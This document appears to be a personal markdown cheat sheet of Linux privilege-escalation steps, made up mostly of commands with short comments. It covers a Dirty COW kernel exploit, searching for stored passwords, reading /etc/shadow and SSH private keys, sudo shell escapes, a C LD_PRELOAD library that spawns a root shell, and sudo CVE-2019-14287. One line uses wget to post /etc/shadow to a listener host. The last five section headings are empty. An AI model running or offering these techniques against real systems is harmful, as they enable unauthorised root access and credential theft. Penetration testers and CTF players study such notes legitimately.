# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)
2. [Stored Passwords](#stored-passwords)
3. [File Permissions](#file-permissions)
4. [Sudo](#sudo)
5. [SUID](#suid)
6. [Capabilities](#capabilities)
7. [Scheduled Tasks](#scheduled-tasks)
8. [NFS Root Squashing](#nfs-root-squashing)
9. [Docker](#docker)

## Kernel Exploits

* [Repo for common kernel exploits](https://github.com/lucyoa/kernel-exploits)

```shell
uname -a
#Google or searchsploit the version
#get exploit code

#we can also use linux-exploit-suggester
./linux-exploit-suggester.sh

#dirty cow exploit
gcc -pthread c0w.c -o cow
#creates executable for exploit

./cow
#privesc

passwd
#elevates user to root
```

## Stored Passwords

```shell
history

ls -la

cat .bash_history
#check for passwords

su root
#use root password

#for stored passwords
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
#check for passwords in current dir

#check using automated tools such as linpeas.sh
```

## File Permissions

```shell
ls -la /etc/passwd

ls -la /etc/shadow
#if we have read access, we can use that

cat /etc/passwd

cat /etc/shadow
#copy both file contents to attacker machine

unshadow passwd shadow
#copy output of required users and their hashes
#we can use this with hashcat or john
#identify hash type with hashcat wiki

su root
#switch to user with password
```

```shell
#hunting for ssh keys
find / -name authorized_keys 2>/dev/null

find / -name id_rsa 2>/dev/null
#private keys

ls -la id_rsa
#attempt to use private key

chmod 600 id_rsa

ssh root@10.10.10.12 -i id_rsa
#we can check into other users' .ssh folder
```

## Sudo

```shell
#sudo shell escaping

sudo -l
#we can run vim as sudo
#get exploit from GTFObins

sudo vim -c ':!/bin/sh'
#gives root shell
```

```shell
#intended functionality

sudo -l
#we can run apache2 as root
#but we do not have exploit in GTFObins

sudo apache2 -f /etc/shadow
#we can view root hash

sudo wget --post=file=/etc/shadow 10.10.14.12:8081
#we get root hash on our listener at port 8081
```

```shell
#LD_PRELOAD

sudo -l
#env var linked to LD_PRELOAD
#we can load our malicious libraries before other libraries

vim shell.c
#add exploit code

gcc -fPIC -shared shell.c -o shell.so -nostartfiles
#fPIC is for position independent code

ls
#shell.so is created

sudo LD_PRELOAD=/home/user/shell.so less
#use full path for .so file
#run with program that can be run as sudo, in this case - less
#this gives us root shell
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell
#CVE-2019-14287
#for !root sudo permissions

sudo -l

sudo -u#-1 /bin/bash
#we get root shell
```

```shell
#CVE-2019-18634

cat /etc/sudoers
#if pwfeedback option is set (asterisks for password)
#and sudo version < 1.8.26
#this exploit is possible

#get exploit from Google
#compile and run it to get root
```

## SUID

## Capabilities

## Scheduled Tasks

## NFS Root Squashing

## Docker
